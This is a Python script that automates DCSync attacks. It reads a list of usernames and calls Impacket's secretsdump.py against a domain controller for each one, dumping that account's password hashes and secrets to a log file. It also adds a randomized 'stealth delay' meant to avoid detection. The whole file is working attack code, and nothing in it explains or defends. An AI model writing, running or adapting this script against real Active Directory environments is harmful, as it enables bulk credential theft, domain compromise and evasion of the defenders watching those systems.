import subprocess
import time
import random

# ---- Config ----
domain = "yourdomain.local"
username = "Administrator"
password = "YourP@ssw0rd!"
dc_ip = "192.168.1.10"
userlist_file = "users.txt"
secretsdump_path = "/path/to/impacket/examples/secretsdump.py"  # Update this path
output_file = "dcsyncoutput.txt"

# ---- Load users ----
with open(userlist_file, "r") as f:
    users = [line.strip() for line in f if line.strip()]

# ---- Loop through users ----
with open(output_file, "a") as log:  # Open once and keep appending
    for user in users:
        print(f"\n[+] DCSyncing user: {user}")
        log.write(f"\n[+] DCSyncing user: {user}\n")

        cmd = [
            "python3",
            secretsdump_path,
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc-user", user
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Print and save stdout
            print(result.stdout)
            log.write(result.stdout)

            # If there's stderr, print and save that too
            if result.stderr:
                print(result.stderr)
                log.write(result.stderr)

        except Exception as e:
            error_msg = f"[!] Error on user {user}: {e}"
            print(error_msg)
            log.write(error_msg + "\n")

        # Stealth delay (1–2 seconds)
        sleep_time = random.uniform(1, 2)
        delay_msg = f"[*] Sleeping for {sleep_time:.2f} seconds..."
        print(delay_msg)
        log.write(delay_msg + "\n")
        time.sleep(sleep_time)

print("\n[✓] Finished DCSync for all users.")
